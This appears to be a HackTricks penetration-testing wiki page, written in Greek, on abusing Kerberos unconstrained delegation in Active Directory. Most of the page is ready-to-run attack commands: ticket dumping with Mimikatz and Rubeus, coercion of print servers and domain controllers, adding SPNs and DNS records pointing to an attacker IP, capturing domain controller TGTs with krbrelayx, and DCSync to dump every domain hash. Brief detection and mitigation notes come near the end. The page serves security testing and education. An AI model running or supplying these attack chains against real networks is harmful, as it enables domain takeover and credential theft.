# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Αυτή είναι μια δυνατότητα που ένας Domain Administrator μπορεί να ορίσει σε οποιοδήποτε **Computer** μέσα στο domain. Έπειτα, κάθε φορά που ένας **user κάνει login** στο Computer, ένα **αντίγραφο του TGT** αυτού του user θα **σταλεί μέσα στο TGS** που παρέχεται από τον DC **και θα αποθηκευτεί στη μνήμη του LSASS**. Επομένως, αν έχετε δικαιώματα Administrator στο machine, θα μπορείτε να κάνετε **dump τα tickets και να κάνετε impersonate τους users** σε οποιοδήποτε machine.

Έτσι, αν ένας domain admin κάνει login σε ένα Computer με ενεργοποιημένη τη δυνατότητα "Unconstrained Delegation" και έχετε local admin δικαιώματα σε αυτό το machine, θα μπορείτε να κάνετε dump το ticket και να κάνετε impersonate τον Domain Admin οπουδήποτε (domain privesc).

Μπορείτε να **βρείτε Computer objects με αυτό το attribute** ελέγχοντας αν το attribute [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) περιέχει το [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Μπορείτε να το κάνετε αυτό με ένα LDAP filter της μορφής ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, το οποίο χρησιμοποιεί το powerview:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Φορτώστε το ticket του Administrator (ή του victim user) στη μνήμη με **Mimikatz** ή **Rubeus για ένα** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Περισσότερες πληροφορίες: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Περισσότερες πληροφορίες σχετικά με το Unconstrained delegation στο ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Force Authentication**

Αν ένας attacker καταφέρει να **compromise έναν υπολογιστή που επιτρέπεται για "Unconstrained Delegation"**, θα μπορούσε να **ξεγελάσει** έναν **Print server**, ώστε να **συνδεθεί αυτόματα** σε αυτόν, **αποθηκεύοντας ένα TGT** στη μνήμη του server.\
Στη συνέχεια, ο attacker θα μπορούσε να εκτελέσει μια **Pass the Ticket attack για να impersonate** το computer account του Print server user.

Για να κάνετε έναν Print server να συνδεθεί σε οποιοδήποτε μηχάνημα, μπορείτε να χρησιμοποιήσετε το [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Αν το TGT είναι από domain controller, θα μπορούσες να εκτελέσεις μια [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) και να αποκτήσεις όλα τα hashes από το DC.\
[**Περισσότερες πληροφορίες για αυτή την attack στο ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

Βρείτε εδώ άλλους τρόπους για να **εξαναγκάσετε authentication:**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Οποιοδήποτε άλλο coercion primitive που κάνει το θύμα να πραγματοποιήσει authentication με **Kerberos** προς το unconstrained-delegation host σας λειτουργεί επίσης. Σε σύγχρονα περιβάλλοντα αυτό συχνά σημαίνει αντικατάσταση του κλασικού PrinterBug flow με **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** ή coercion βασισμένο σε **WebClient/WebDAV**, ανάλογα με το ποιο RPC surface είναι προσβάσιμο.

### Abusing user/service account με unconstrained delegation

Το unconstrained delegation **δεν περιορίζεται σε computer objects**. Ένα **user/service account** μπορεί επίσης να ρυθμιστεί ως `TRUSTED_FOR_DELEGATION`. Σε αυτό το σενάριο, η πρακτική απαίτηση είναι ο account να λαμβάνει Kerberos service tickets για ένα **SPN που του ανήκει**.

Αυτό οδηγεί σε 2 πολύ συνηθισμένα offensive paths:

1. Παραβιάζετε το password/hash του **user account** με unconstrained delegation και στη συνέχεια **προσθέτετε ένα SPN** στον ίδιο account.
2. Ο account διαθέτει ήδη ένα ή περισσότερα SPNs, αλλά ένα από αυτά δείχνει σε ένα **stale/decommissioned hostname**· η αναδημιουργία του ελλείποντος **DNS A record** αρκεί για να κάνετε hijack το authentication flow χωρίς να τροποποιήσετε το SPN set.<sup>[[8]](#references)</sup>

Ελάχιστο Linux flow:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Σημειώσεις:

- Αυτό είναι ιδιαίτερα χρήσιμο όταν το unconstrained principal είναι **service account** και έχετε μόνο τα credentials του, όχι code execution σε joined host.
- Αν ο target user έχει ήδη ένα **stale SPN**, η επαναδημιουργία του αντίστοιχου **DNS record** μπορεί να είναι λιγότερο θορυβώδης από την εγγραφή ενός νέου SPN στο AD.
- Το πρόσφατο Linux-centric tradecraft χρησιμοποιεί τα `addspn.py`, `dnstool.py`, `krbrelayx.py` και ένα coercion primitive· δεν χρειάζεται να αγγίξετε Windows host για να ολοκληρώσετε την αλυσίδα.

### Κατάχρηση του Unconstrained Delegation με computer που δημιουργήθηκε από attacker

Τα σύγχρονα domains συχνά έχουν `MachineAccountQuota > 0` (προεπιλογή 10), επιτρέποντας σε οποιοδήποτε authenticated principal να δημιουργήσει έως και N computer objects. Αν διαθέτετε επίσης το token privilege `SeEnableDelegationPrivilege` (ή ισοδύναμα δικαιώματα), μπορείτε να ρυθμίσετε το computer που δημιουργήθηκε πρόσφατα ώστε να είναι trusted for unconstrained delegation και να συλλέξετε εισερχόμενα TGTs από privileged systems.<sup>[[1]](#references)</sup>

Ροή υψηλού επιπέδου:

1) Δημιουργήστε ένα computer που ελέγχετε
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) Κάντε το ψεύτικο hostname επιλύσιμο μέσα στο domain
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) Ενεργοποίηση του Unconstrained Delegation στον υπολογιστή υπό τον έλεγχο του attacker
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
Γιατί λειτουργεί: με unconstrained delegation, το LSA σε έναν υπολογιστή με ενεργοποιημένο delegation αποθηκεύει προσωρινά τα εισερχόμενα TGT. Αν ξεγελάσετε ένα DC ή έναν privileged server ώστε να πραγματοποιήσει authentication στο fake host σας, το machine TGT του θα αποθηκευτεί και μπορεί να γίνει export.

4) Εκκινήστε το krbrelayx σε export mode και προετοιμάστε το Kerberos material
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) Εξαναγκάστε authentication από το DC/servers προς το fake host
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
Το krbrelayx θα αποθηκεύει αρχεία ccache όταν ένα μηχάνημα πραγματοποιεί authentication, για παράδειγμα:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) Χρησιμοποιήστε το captured TGT του DC machine για να εκτελέσετε DCSync
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
- `MachineAccountQuota > 0` επιτρέπει τη δημιουργία υπολογιστών από μη προνομιούχους χρήστες· διαφορετικά απαιτούνται explicit δικαιώματα.
- Η ρύθμιση του `TRUSTED_FOR_DELEGATION` σε έναν υπολογιστή απαιτεί `SeEnableDelegationPrivilege` (ή domain admin).
- Βεβαιωθείτε ότι υπάρχει name resolution προς το fake host (DNS A record), ώστε ο DC να μπορεί να συνδεθεί σε αυτό μέσω FQDN.
- Το coercion απαιτεί ένα viable vector (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN κ.λπ.). Απενεργοποιήστε τα στους DCs, αν είναι δυνατό.
- Αν ο λογαριασμός-θύμα έχει σημειωθεί ως **"Account is sensitive and cannot be delegated"** ή είναι μέλος των **Protected Users**, το forwarded TGT δεν θα συμπεριληφθεί στο service ticket, επομένως αυτή η αλυσίδα δεν θα αποδώσει reusable TGT.<sup>[[9]](#references)</sup>
- Αν το **Credential Guard** είναι ενεργοποιημένο στον client/server που πραγματοποιεί το authentication, τα Windows αποκλείουν το **Kerberos unconstrained delegation**, γεγονός που μπορεί να προκαλέσει την αποτυχία κατά τα άλλα έγκυρων coercion paths από την πλευρά του operator.

Ιδέες για detection και hardening:

- Δημιουργήστε alert για τα Event ID 4741 (δημιουργία computer account) και 4742/4738 (αλλαγή computer/user account), όταν έχει οριστεί το UAC `TRUSTED_FOR_DELEGATION`.
- Παρακολουθείτε ασυνήθιστες προσθήκες DNS A-records στη domain zone.
- Παρακολουθείτε spikes στα 4768/4769 από μη αναμενόμενα hosts και DC-authentications προς non-DC hosts.
- Περιορίστε το `SeEnableDelegationPrivilege` σε ένα ελάχιστο σύνολο, ορίστε `MachineAccountQuota=0` όπου είναι εφικτό και απενεργοποιήστε το Print Spooler στους DCs. Επιβάλετε LDAP signing και channel binding.

### Mitigation

- Περιορίστε τα DA/Admin logins σε συγκεκριμένες υπηρεσίες.
- Ορίστε το "Account is sensitive and cannot be delegated" για privileged accounts.

## References

- [1] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – Domain compromise via unrestricted delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (CME fork)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Unconstrained Delegation in Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – Domain compromise via DC print server and Kerberos delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

{{#include ../../banners/hacktricks-training.md}}
